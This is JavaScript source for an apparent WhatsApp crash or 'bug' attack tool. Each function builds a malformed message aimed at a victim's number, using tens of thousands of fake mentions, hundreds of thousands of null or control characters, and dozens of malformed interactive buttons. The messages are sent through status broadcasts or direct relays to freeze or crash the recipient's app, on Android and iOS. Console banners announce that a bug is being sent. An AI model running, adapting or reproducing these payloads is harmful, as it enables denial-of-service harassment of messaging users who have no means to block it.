  console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }

  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath:
            "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 1000 * 40,
                },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await otax.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function palaLuMappimg(otax, target) {
  await otax.relayMessage("status@broadcast", {
    interactiveResponseMessage: {
      body: {
        text: " @null | Manta ¿? ",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "call_permission_request",
        paramsJson: "{}",
        version: 3
      },
      contextInfo: {
        remoteJid: Math.random().toString(36) + " Tr4sh.corp¡! ",
        isForwarded: true,
        forwardingScore: 999,
        urlTrackingMap: {
          urlTrackingMapElements: Array.from({ length: 500000 }, () => ({
            "\u0000": "\u0000"
          }))
        }
      }
    }
  }, {
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: { status_setting: "contacts" },
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: []
              }
            ]
          }
        ]
      }
    ]
  });
}

async function OtaXxxdelay(target, mention) {
  console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
  const generateMessage = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "Otax",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath:
            "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, generateMessage, {});

  await otax.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await otax.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "𝐁𝐞𝐭𝐚 𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 - 𝟗𝟕𝟒𝟏" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function invisotax(isTarget) {
  console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
  let AyunCantik = JSON.stringify({
    status: true,
    criador: "OtaxAyun",
    resultado: {
      type: "md",
      ws: {
        _events: {
          "CB:ib,,dirty": ["Array"]
        },
        _eventsCount: 80000,
        _maxListeners: 0,
        url: "wss://web.whatsapp.com/ws/chat",
        config: {
          version: ["Array"],
          browser: ["Array"],
          waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
          sockCectTimeoutMs: 2000,
          keepAliveIntervalMs: 30000,
          logger: {},
          printQRInTerminal: false,
          emitOwnEvents: true,
          defaultQueryTimeoutMs: 6000,
          customUploadHosts: [],
          retryRequestDelayMs: 250,
          maxMsgRetryCount: 5,
          fireInitQueries: true,
          auth: { Object: "authData" },
          markOnlineOnsockCect: true,
          syncFullHistory: true,
          linkPreviewImageThumbnailWidth: 192,
          transactionOpts: { Object: "transactionOptsData" },
          generateHighQualityLinkPreview: false,
          options: {},
          appStateMacVerification: { Object: "appStateMacData" },
          mobile: true
        }
      }
    }
  });
  const generatePaymentMessage = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          nativeFlowMessage: {
            buttons: [
              {
                name: "review_order",
                buttonParamsJson: {
                  reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
                  order: {
                    status: "completed",
                    order_type: "ORDER"
                  },
                  share_payment_status: true,
                  contextInfo: {
                    mentionedJid: [
                      isTarget,
                      ...Array.from({ length: 40000 }, () =>
                        "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                      )
                    ],
                    isSampled: true,
                    participant: isTarget,
                    remoteJid: "status@broadcast",
                    forwardingScore: 9741,
                    isForwarded: true
                  }
                }
              }
            ],
            messageParamsJson: "",
            buttons: [
              { name: "single_select", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "payment_method", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "call_permission_request", buttonParamsJson: AyunCantik + "\u0003", voice_call: "call_galaxy" },
              { name: "form_message", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "wa_payment_learn_more", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "wa_payment_transaction_details", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "wa_payment_fbpin_reset", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "catalog_message", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "payment_info", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "review_order", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "send_location", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "payments_care_csat", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "view_product", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "payment_settings", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "address_message", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "automated_greeting_message_view_catalog", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "open_webview", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "message_with_link_status", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "payment_status", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "galaxy_costum", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "extensions_message_v2", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "landline_call", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "mpm", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "cta_copy", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "cta_url", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "review_and_pay", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "galaxy_message", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "cta_call", buttonParamsJson: AyunCantik + "\u0003" }
            ]
          }
        }
      }
    }
  }

  const msg = generateWAMessageFromContent("status@broadcast", generatePaymentMessage, {});

  await otax.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: isTarget },
          content: undefined
        }]
      }]
    }]
  }, {
    participant: isTarget
  });
}
async function OtaxiPhone(target) {
  try {
    await otax.relayMessage(
      target,
      {
        extendedTextMessage: {
          text: "×͜×ᴏᴛᴀx ᴀᴛᴛᴀᴄᴋ ʏᴏᴜ一緒̊",
          contextInfo: {
            stanzaId: "1234567890ABCDEF",
            participant: target,
            quotedMessage: {
              callLogMesssage: {
                isVideo: true,
                callOutcome: "1",
                durationSecs: "0",
                callType: "REGULAR",
                participants: [
                  {
                    jid: target,
                    callOutcome: "1",
                  },
                ],
              },
            },
            remoteJid: target,
            conversionSource: "source_example",
            conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
            conversionDelaySeconds: 10,
            forwardingScore: 9999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: "Example Advertiser",
              mediaType: "IMAGE",
              jpegThumbnail:
                "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
              caption: "This is an ad caption",
            },
            placeholderKey: {
              remoteJid: target,
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: 86400,
            ephemeralSettingTimestamp: "1728090592378",
            ephemeralSharedSecret:
              "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
            externalAdReply: {
              title: "×͜×ᴏᴛᴀx ᴀᴛᴛᴀᴄᴋ ʏᴏᴜ一緒‎",
              body: "×͜×ᴏᴛᴀx ᴀᴛᴛᴀᴄᴋ ʏᴏᴜ一緒‏‎",
              mediaType: "VIDEO",
              renderLargerThumbnail: true,
              previewTtpe: "VIDEO",
              thumbnail:
                "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
              sourceType: " x ",
              sourceId: " x ",
              sourceUrl: "https://wa.me/settings",
              mediaUrl: "https://wa.me/settings",
              containsAutoReply: true,
              showAdAttribution: true,
              ctwaClid: "ctwa_clid_example",
              ref: "ref_example",
            },
            entryPointConversionSource: "entry_point_source_example",
            entryPointConversionApp: "entry_point_app_example",
            entryPointConversionDelaySeconds: 5,
            disappearingMode: {},
            actionLink: {
              url: "https://wa.me/settings",
            },
            groupSubject: "Example Group Subject",
            parentGroupJid: "6287888888888-1234567890@g.us",
            trustBannerType: "trust_banner_example",
            trustBannerAction: 1,
            isSampled: false,
            utm: {
              utmSource: "utm_source_example",
              utmCampaign: "utm_campaign_example",
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "6287888888888-1234567890@g.us",
              serverMessageId: 1,
              newsletterName: " X ",
              contentType: "UPDATE",
              accessibilityText: " X ",
            },
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net",
            },
            smbClientCampaignId: "smb_client_campaign_id_example",
            smbServerCampaignId: "smb_server_campaign_id_example",
            dataSharingContext: {
              showMmDisclosure: true,
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}

const OtaxNakal = {
  key: {
    remoteJid: "p",
    fromMe: false,
    participant: "0@s.whatsapp.net",
  },
  message: {
    interactiveResponseMessage: {
      body: {
        text: "OtaxNieh",
        format: "DEFAULT",
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"OtaxNiehh...\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"xrelly@cloud.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(
          500000
        )}\",\"screen_0_TextInput_1\":\"makkawin\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
        version: 3,
      },
    },
  },
};
async function VampKilliOS(target) {
  console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
  otax.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: `Otax pencari janda` + "࣯\u0003".repeat(90000),
        contextInfo: {
          fromMe: false,
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "iOS Lu Diserang janda" + "\u0003".repeat(90000),
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          },
        },
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      participant: {
        jid: target,
        quoted: null,
      },
    },
    {
      messageId: null,
    }
  );
}
async function fuckgroup(target) {
  let AyunCantik = JSON.stringify({
    status: true,
    criador: "OtaxAyun",
    resultado: {
      type: "md",
      ws: {
        _events: {
          "CB:ib,,dirty": ["Array"]
        },
        _eventsCount: 80000,
        _maxListeners: 0,
        url: "wss://web.whatsapp.com/ws/chat",
        config: {
          version: ["Array"],
          browser: ["Array"],
          waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
          sockCectTimeoutMs: 2000,
          keepAliveIntervalMs: 30000,
          logger: {},
          printQRInTerminal: false,
          emitOwnEvents: true,
          defaultQueryTimeoutMs: 6000,
          customUploadHosts: [],
          retryRequestDelayMs: 250,
          maxMsgRetryCount: 5,
          fireInitQueries: true,
          auth: { Object: "authData" },
          markOnlineOnsockCect: true,
          syncFullHistory: true,
          linkPreviewImageThumbnailWidth: 192,
          transactionOpts: { Object: "transactionOptsData" },
          generateHighQualityLinkPreview: false,
          options: {},
          appStateMacVerification: { Object: "appStateMacData" },
          mobile: true
        }
      }
    }
  });
  const messageContent = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "×͜×ᴏᴛᴀx ᴀᴛᴛᴀᴄᴋ ʏᴏᴜ一緒",
            hasMediaAttachment: false
          },
          body: {
            text: "ꦾ".repeat(50000),
          },
          nativeFlowMessage: {
            messageParamsJson: "",
            buttons: [
              { name: "single_select", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "payment_method", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "call_permission_request", buttonParamsJson: AyunCantik + "\u0003", voice_call: "call_galaxy" },
              { name: "form_message", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "wa_payment_learn_more", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "wa_payment_transaction_details", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "wa_payment_fbpin_reset", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "catalog_message", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "payment_info", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "review_order", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "send_location", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "payments_care_csat", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "view_product", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "payment_settings", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "address_message", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "automated_greeting_message_view_catalog", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "open_webview", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "message_with_link_status", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "payment_status", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "galaxy_costum", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "extensions_message_v2", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "landline_call", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "mpm", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "cta_copy", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "cta_url", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "review_and_pay", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "galaxy_message", buttonParamsJson: AyunCantik + "\u0003" },
              { name: "cta_call", buttonParamsJson: AyunCantik + "\u0003" }
            ]
          }
        }
      }
    }
  }, {});

  await otax.relayMessage(target, messageContent.message, {
    messageId: messageContent.key.id
  });

  console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
}

async function OtaxNewAttack(target, ptcp = true) {
  console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
  let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "𝗢𝘁𝗮𝘅.𝐂𝐥𝐨𝐮𝐝𝐬",
            hasMediaAttachment: false
          },
          body: {
            text: "ᵒᵗᵃˣ ᵛˢ ᵉᵛᵉʳʸᵇᵒᵈʸ" + "ꦾ".repeat(100000),
          },
          nativeFlowMessage: {
            messageParamsJson: "",
            buttons: [{
              name: "cta_url",
              buttonParamsJson: "ᵒᵗᵃˣ ᵛˢ ᵐᵃʳᵏ ᶻᵘᶜᵏᵉʳᵇᵉʳᵍ"
            },
            {
              name: "call_permission_request",
              buttonParamsJson: "ᵖᵃˢᵘᵏᵃⁿ ᵃⁿᵗᶦ ᵍᶦᵐᵐᶦᶜᵏ"
            }
            ]
          }
        }
      }
    }
  }, {});
  await otax.relayMessage(target, msg.message, ptcp ? {
    participant: {
      jid: target
    }
  } : {});
}

async function bulldozer(otax, target) {
  console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await otax.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function manta(otax, target) {
  const {
    jidDecode,
    generateMessageIDV2,
    encodeSignedDeviceIdentity,
    jidEncode
  } = require("@ayunlove/bails");

  let message = { conversation: "Manta" }

  let gwehj = otax.authState.creds.me.id
  let meLid = otax.authState.creds.me?.lid
  let meDecode = jidDecode(gwehj) || {}
  let mePN = meDecode.user || null
  let meLidDecode = meLid ? jidDecode(meLid) : null
  let meLidU = meLidDecode?.user || null
  let msgId = generateMessageIDV2(gwehj)
  let ngentodd = meLidDecode?.user ? jidEncode(meLidDecode.user, "lid", undefined) : gwehj
  let meMsg = { deviceSentMessage: { destinationJid: target, message }, messageContextInfo: message.messageContextInfo }
  let xnxxxxx = {}
  let stanza
  const kontol = message.imageMessage ? "image" : message.videoMessage ? (message.videoMessage.gifPlayback ? "gif" : "video") : message.audioMessage ? (message.audioMessage.ptt ? "ptt" : "audio") : message.documentMessage ? "document" : message.stickerMessage ? "sticker" : undefined

  if (kontol) xnxxxxx.mediatype = kontol

  await otax.authState.keys.transaction(async () => {
    let devices = await otax.getUSyncDevices([ngentodd, target].filter(Boolean), true, false)
    let meR = [], otR = []

    for (let { user, jid: dJid } of devices) {
      if (!dJid) continue
      if (dJid === gwehj || (meLid && dJid === meLid)) continue

      let isMe = user === mePN || user === meLidU
        ; (isMe ? meR : otR).push(dJid)
    }

    let all = [...meR, ...otR].filter(Boolean)
    await otax.assertSessions(all)

    const [{ nodes: meN, shouldIncludeDeviceIdentity: s1 }, { nodes: otN, shouldIncludeDeviceIdentity: s2 }] =
      await Promise.all([MantaX.createParticipantNodes(meR, { conversation: "⟅̵॒̊༑̴ 𝐓͜͡𝐝͜𝐗͡ 🍷̴⃟ꢵ 𝐇͜͡𝐀𝐑͜͡𝐌𝐅͜͡𝐔𝐋͡ 𝐢͜͡𝐍𝐕͜͡𝐀𝐒͜͡𝐈𝐎͜͡𝐈𝐎͜͡𝐍 ༑̴⟆̊" }), otax.createParticipantNodes(otR, message, xnxxxxx, meMsg)])

    let mekiii = [...meN.map(n => (n?.content?.[0] && (n.content[0].content = Buffer.from("hello world", "base64")), n)), ...otN]

    let incDI = s1 || s2

    stanza = { tag: "message", attrs: { id: msgId, to: target, type: ["imageMessage", "videoMessage", "audioMessage", "documentMessage", "stickerMessage"].some(k => k in message) ? "media" : ("reactionMessage" in message ? "reaction" : "text") }, content: mekiii.length ? [{ tag: "participants", attrs: {}, content: mekiii }] : [] }

    if (incDI) {
      stanza.content.push({ tag: "device-identity", attrs: {}, content: encodeSignedDeviceIdentity(otax.authState.creds.account, true) })
    }

    await otax.sendNode(stanza)
  }, gwehj)

  return stanza
}
async function protocolbug7(isTarget, mention) {
  console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
